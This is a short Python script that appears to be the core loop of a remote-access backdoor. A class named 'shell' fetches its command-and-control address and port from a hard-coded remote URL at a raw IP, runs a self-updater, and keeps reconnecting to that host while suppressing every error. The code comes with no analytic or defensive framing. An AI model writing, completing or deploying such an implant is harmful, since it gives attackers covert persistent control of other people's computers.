#!/usr/bin/python

import ConfigManager, functions, updater

class shell(object):
    config = ConfigManager.ConfigManager("http://85.255.5.44/vxsrfp/eurnni.html")
    host = config.IpAddress
    port = config.Port

    updater = updater.Updater()

    notConnected = True
    exiting = False

    functions = functions.functions(host, port)
    def main(self):
        self.updater.update()
        while (self.notConnected and not self.exiting):
            try:
                self.notConnected = False
                self.exiting = self.functions.start()
                self.notConnected = True
            except:
                self.notConnected = True

if __name__ == '__main__':
    shell().main()










